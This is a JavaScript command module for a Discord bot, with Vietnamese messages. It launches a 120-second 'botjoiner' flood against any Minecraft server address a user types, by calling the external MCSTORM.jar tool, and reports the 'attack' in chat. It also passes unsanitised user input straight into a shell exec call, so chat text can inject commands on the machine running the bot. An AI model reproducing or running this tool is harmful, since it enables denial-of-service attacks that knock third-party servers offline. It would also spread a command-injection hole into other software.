const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const protocol = message.content.split (" ")[3]
const conf = require('../conf.json');
var room = conf.commandroom;
var java = conf.java;

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu lệnh tấn công ;methods 1.1.1.1 25565 757`")
	message.channel.send(embed1);
	return;
	}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Yêu cầu đồng trí ghi Pỏt`")
	message.channel.send(embed1);
	return;
	}

if(!args[2]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Yêu cầu đồng trí ghi phiên bản BOT`")
	message.channel.send(embed1);
	return;
	}
	
if (message.channel.id != room) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Uả lệnh j lạ dzi')
	message.channel.send(embed1);
	return;
  }
  
var exec = require('child_process').exec
exec(`${java} -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar ${host}:${port} ${protocol} botjoiner 120 -1`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('susbot')
	.setTimestamp()
	.setDescription("**► Cuộc tấn công đã dừng lại 💥**")
	.setFooter('© Nhà phát triển MINIFLEX.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail()
 message.channel.send(embed);
 }, 120000); //time in milliseconds

console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('susbot')
	.setTimestamp()
	.setDescription("**Ngưi Dùng**: `" + message.author.username + "` \n **Máy Chủ**: `" + host + "` \n **Pỏt**: `" + port + "` \n **Phiên Bản**: `" + protocol + "`\n \n **Phương pháp**: `BotJoiner 💥` \n **Số lượng Bot**: `10.000 🚀` \n **Thời gian**: `120 giây 🕒`")
	.setFooter('© Nhà phát triển MINIFLEX.', client.user.avatarURL)
	.setTimestamp()
	
	.setThumbnail()
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['botjoiner'],
  permLevel: 0
}

exports.help = {
  name: 'botjoiner',
  description: 'Özel',
  usage: 'botjoiner'
}
